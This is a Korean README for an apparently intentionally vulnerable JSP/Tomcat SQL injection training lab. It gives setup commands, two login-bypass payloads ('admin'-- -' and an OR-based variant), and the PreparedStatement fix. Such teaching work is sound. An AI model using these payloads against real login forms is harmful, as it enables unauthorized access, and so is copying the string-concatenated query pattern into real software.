# JSP — SQL Injection

| | |
|---|---|
| 버그클래스 | SQL Injection (Java/JDBC) |
| 언어 | JSP / Tomcat |
| 난이도 | ★★☆ |
| 포트 | 9601 |

## 학습 목표
Statement 문자열 결합 쿼리에 SQLi. PHP/Flask와 동일한 버그클래스를 Java/JSP 환경에서.

## 실행
```bash
./gen_flags.sh
make up-jsp   # 또는: docker compose up -d --build jsp-sqli
# http://localhost:9601
```

## 진행
1. `login.jsp?userid=admin'-- -&userpw=x`.
2. 또는 `userid=' or userid='admin'-- -`.
3. admin 인식 → flag.

> 참조 풀이(강사용)는 비공개 레포에서 별도 관리한다 — 공개 레포에는 포함하지 않는다.

## 대응방안
PreparedStatement 파라미터 바인딩.
